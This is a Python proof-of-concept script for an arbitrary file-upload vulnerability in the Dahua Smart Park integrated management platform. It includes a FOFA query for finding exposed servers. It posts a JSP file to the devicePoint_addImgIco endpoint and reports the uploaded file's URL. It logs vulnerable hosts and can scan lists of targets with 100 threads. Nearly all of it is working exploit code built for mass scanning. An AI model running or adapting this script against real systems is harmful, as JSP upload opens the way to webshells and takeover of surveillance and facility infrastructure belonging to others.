#-*- coding: utf-8 -*-
import argparse,sys,requests,time,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
#fofa：body="/WPMS/asset/lib/gridster/"
def banner():
    test = """
   _____ __  ______    ____  ______   ____  ___    ____  __ __
  / ___//  |/  /   |  / __ \/_  __/  / __ \/   |  / __ \/ //_/
  \__ \/ /|_/ / /| | / /_/ / / /    / /_/ / /| | / /_/ / ,<   
 ___/ / /  / / ___ |/ _, _/ / /    / ____/ ___ |/ _, _/ /| |  
/____/_/  /_/_/  |_/_/ |_| /_/    /_/   /_/  |_/_/ |_/_/ |_|                                                                                                                                                                                                                                                    
                        tag:  大华智慧园区综合管理平台文件上传 POC                                       
                            @version: 1.0.0   @author by gallopsec            
"""
    print(test)
headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "Content-Type": "multipart/form-data; boundary=f3aeb22be281d77542546a2f71e20982"
        }
def poc(target):
    url = target+"/emap/devicePoint_addImgIco?hasSubsystem=true"
    try:
        data = (
            "--f3aeb22be281d77542546a2f71e20982\r\n"
            'Content-Disposition: form-data; name="upload"; filename="1ndex.jsp"\r\n'
            "Content-Type: application/octet-stream\r\n"
            "Content-Transfer-Encoding: binary\r\n"
            "\r\n"
            "123\r\n"
            "--f3aeb22be281d77542546a2f71e20982--"
        )
        res = requests.post(url,headers=headers,data=data,timeout=5,verify=False)
        result = re.findall('''"data":"(.*?)"''', res.text, re.S)[0]
        if res.json()['code'] == 1:
            print(f"[+] {target} is vulable"+ f"\n复制网址进行验证(若为123则存在漏洞):"+ target + "/upload/emap/society_new/" + result)
            with open("request.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
            return True
        else:
            print(f"[-] {target} is not vulable")
            return False
    except:
        print(f"[*] {target} error")
        return False
def main():
    banner()
    parser = argparse.ArgumentParser(description='SMART-PARK UploadFile POC')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()
